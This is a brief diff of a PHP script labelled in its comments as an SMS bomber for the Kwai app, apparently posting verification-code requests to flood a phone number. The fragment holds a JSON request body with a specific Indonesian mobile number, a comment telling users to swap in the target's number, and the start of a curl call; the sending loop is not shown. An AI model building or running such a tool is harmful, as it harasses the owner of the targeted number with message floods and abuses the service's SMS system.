@@ -1,6 +1,6 @@
 <?php
-*//@sandro.putraa
-*//Bomb SMS KWAI :v
+//@sandro.putraa
+//Bomb SMS KWAI :v
 
 $body = '{"mobile":82332657754,"countryCode":"+62","bizType":38}';  //No hp lu kasi setelah "mobile": ( 82xxxxxxxxx ) tanpa 62
 $ch = curl_init();
